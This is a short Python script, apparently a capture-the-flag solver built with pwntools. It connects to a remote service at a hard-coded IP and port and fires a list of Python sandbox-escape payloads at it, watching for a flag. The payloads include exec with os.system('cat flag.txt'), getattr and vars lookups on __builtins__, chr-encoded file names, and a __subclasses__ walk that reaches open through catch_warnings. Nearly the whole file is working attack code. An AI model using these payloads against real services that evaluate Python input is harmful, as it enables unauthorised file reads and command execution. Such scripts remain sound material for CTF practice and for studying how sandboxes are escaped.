#!/usr/bin/env python3
from pwn import *

host = '212.2.250.33'
port = 30968

def test_payload(payload):
    io = remote(host, port, level='error')
    io.recvuntil(b'>', timeout=2)
    io.sendline(payload.encode())
    response = io.recv(timeout=2).decode()
    io.close()
    return response

# Test various bypass techniques
payloads = [
    # Direct file read attempts
    "open('flag.txt').read()",
    "open('flag').read()",
    
    # Using getattr
    "getattr(__builtins__, 'open')('flag.txt').read()",
    
    # Using exec
    "exec('import os; os.system(\"cat flag.txt\")')",
    
    # Using compile
    "compile('open(\"flag.txt\").read()', '<string>', 'eval')",
    
    # Using chr to build strings
    "open(chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read()",
    
    # Using globals/locals
    "[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['open']('flag.txt').read()",
    
    # Simple list comprehension with file
    "[open('flag.txt').read()]",
    
    # Using eval within eval
    "eval('open(\"flag.txt\").read()')",
    
    # Try to access __builtins__ directly
    "__builtins__.open('flag.txt').read()",
    
    # Using vars
    "vars(__builtins__)['open']('flag.txt').read()",
]

print("[*] Testing various payloads...\n")
for i, payload in enumerate(payloads, 1):
    print(f"[{i}] Testing: {payload[:60]}...")
    try:
        result = test_payload(payload)
        if 'Kaal{' in result or 'flag' in result.lower():
            print(f"    [+] SUCCESS! Response: {result}")
            break
        else:
            print(f"    [-] Response: {result[:100]}")
    except Exception as e:
        print(f"    [!] Error: {e}")
    print()
